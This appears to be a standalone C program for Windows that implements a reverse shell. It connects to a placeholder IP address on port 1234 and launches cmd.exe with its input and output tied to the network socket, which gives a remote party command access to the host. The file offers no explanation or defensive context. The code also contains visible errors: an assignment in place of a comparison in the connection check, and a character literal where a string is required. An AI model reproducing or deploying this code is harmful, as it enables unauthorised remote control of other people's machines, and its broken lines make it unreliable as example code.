#include <winsock2.h>
#include <stdio.h>
#include <windows.h>
#include <ws2tcpip.h>
#pragma comment(lib, "Ws2_32.lib")

 

int main()
{
    SOCKET shell;
    sockaddr_in  shell_addr;
    WSADATA wsa;
    STARTUPINFO si;
    PROCESS_INFORMATION pi;
    char RecvServer[512];
    int connection;
    char ip_addr[] = "<ip_addr>";
    int port= 1234;


    WSAStartup(MAKEWORD(2,2), &wsa);      //Initialze Winsock
    shell = WSASocket(AF_INET, SOCK_STREAM, IPPROTO_TCP, NULL, (unsigned int)NULL, (unsigned int) NULL);     // Create a TCP Socket

    shell_addr.sin_port = htons(port);
    shell_addr.sin_family = AF_INET;
    shell_addr.sin_addr.s_addr = inet_addr(ip_addr);
    
    connection= WSAConnect(shell, (SOCKADDR *)&shell_addr, sizeof(shell_addr), NULL, NULL, NULL, NULL);   //Connect to target

    if(connection= SOCKET_ERROR)
    {
        printf("[!] Connection to the target server failed");
        exit(0);
    }
    else
    {
        recv(shell, RecvServer, sizeof(RecvServer), 0);
        memset(&si, 0, sizeof(si));
        si.cb= sizeof(si);
        si.dwFlags= (STARTF_USESTDHANDLES | STARTF_USESHOWWINDOW);
        si.hStdInput= si.hStdOutput= si.hStdError= (HANDLE)shell;
        CreateProcess(NULL , 'cmd.exe', NULL, NULL, TRUE, 0, NULL, NULL, &si, &pi);  //Spawn Command prompt
        WaitForSingleObject(pi.hProcess, INFINITE);
        CloseHandle(pi.hProcess);
        CloseHandle(pi.hThread);
        memset(RecvServer, 0, sizeof(RecvServer));
    }
}